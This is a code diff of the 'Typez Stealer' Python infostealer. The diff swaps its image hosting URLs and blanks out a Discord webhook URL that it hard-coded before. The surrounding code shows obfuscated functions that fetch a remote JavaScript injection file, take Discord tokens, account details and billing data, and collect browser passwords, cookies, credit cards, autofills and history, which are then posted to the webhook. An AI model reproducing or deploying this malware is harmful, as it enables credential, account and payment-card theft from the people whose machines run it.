@@ -71,7 +71,7 @@ for module in ModuleRequirements:
 
 
 
-h00k = "https://discord.com/api/webhooks/1237076459974037544/IX295GvTuZOJA5_6_XcY2-FpgGZ71pxv9XI4rneSyOhvHdeQmb_2p0eFs4Mon-TX5EQc"
+h00k = ""
 inj3c710n_url = f"https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 
 class DATA_BLOB(Structure):
@@ -410,7 +410,7 @@ def UP104D70K3N(token, path):
     }
     username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
-    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg"
+    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://i.postimg.cc/RVfpMRkz/xd.jpg"
     billing = G3781111N6(token)
     badge = G3784D63(flags)
     friends = Tr1M(G37UHQFr13ND5(token))
@@ -482,7 +482,7 @@ def UP104D70K3N(token, path):
                 },
             "footer": {
                 "text": f"Typez Stealer",
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg"
+                "icon_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
@@ -490,7 +490,7 @@ def UP104D70K3N(token, path):
             }
         ],
         "username": f"Typez Stealer | t.me/Typez Stealer",
-        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg",
+        "avatar_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg",
         "attachments": []
         }
     L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
@@ -518,12 +518,12 @@ def UP104D(name, link):
                 "fields": link,
                 "footer": {
                     "text": f"Typez Stealer",
-                    "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg"
+                    "icon_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg"
                 },
                 }
             ],
             "username": f"Typez Stealer",
-            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg",
+            "avatar_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg",
             "attachments": []
             }
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
@@ -550,12 +550,12 @@ def UP104D(name, link):
                 "title": f"Typez Stealer | File Stealer",
                 "footer": {
                     "text": f"Typez Stealer",
-                    "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg"
+                    "icon_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg"
                 }
                 }
             ],
             "username": f"Typez Stealer",
-            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg",
+            "avatar_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg",
             "attachments": []
             }
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
@@ -779,25 +779,25 @@ def G378r0W53r5(br0W53rP47H5):
                 "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [TypezPasswords.txt]({filess[0]})",
                 "color": 2895667,
                 "footer": {"text": f"Typez Stealer",  
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg"}
+                "icon_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg"}
             },
             {
                 "title": f"Typez Stealer | Cookies Stealer",
                 "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [TypezCookies.txt]({filess[1]})",
                 "color": 2895667,
                 "footer": {"text": f"Typez Stealer",  
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg"}
+                "icon_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg"}
             },
             {
                 "title": f"Typez Stealer | Browser Data",
                 "description": f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [TypezHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [TypezAutofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [TypezCreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [TypezBookmarks.txt]({filess[5]})",
                 "color": 2895667,
                 "footer": {"text": f"Typez Stealer",  
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg"}
+                "icon_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg"}
             }
         ],
         "username": f"Typez Stealer",
-        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg",
+        "avatar_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg",
         "attachments": []
     }
     L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
@@ -870,12 +870,12 @@ def G47H3rZ1P5(paths1, paths2, paths3):
             "color": 2895667,
             "footer": {
                 "text": f"Typez Stealer",
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg"
+                "icon_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg"
             }
             }
         ],
         "username": f"Typez Stealer",
-        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Typez-Stealer/main/img/xd.jpg",
+        "avatar_url": "https://i.postimg.cc/RVfpMRkz/xd.jpg",
         "attachments": []
     }
     
